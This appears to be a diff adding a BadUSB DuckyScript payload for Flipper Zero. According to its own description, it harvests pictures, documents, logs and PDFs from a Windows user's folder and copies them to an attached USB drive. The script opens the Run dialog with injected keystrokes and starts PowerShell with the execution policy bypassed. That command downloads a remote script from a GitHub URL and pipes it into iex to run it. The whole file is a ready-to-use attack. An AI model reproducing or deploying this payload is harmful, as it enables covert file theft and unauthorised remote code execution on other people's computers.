@@ -1,0 +1,20 @@
+
+REM Title: beigeworm's Exfiltrate files USB Drive
+REM Author: @beigeworm
+REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to newly connected USB drive.
+REM Target: Windows 10
+
+REM SETUP (optional)
+REM Add your USB drive Name in quotes for $driveName
+REM Add Y or N in quotes for $Hidden (hides console window)
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -C $driveName = ''; $Hidden = ''; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Exfiltrate-to-USB/main.ps1 | iex
+ENTER
+
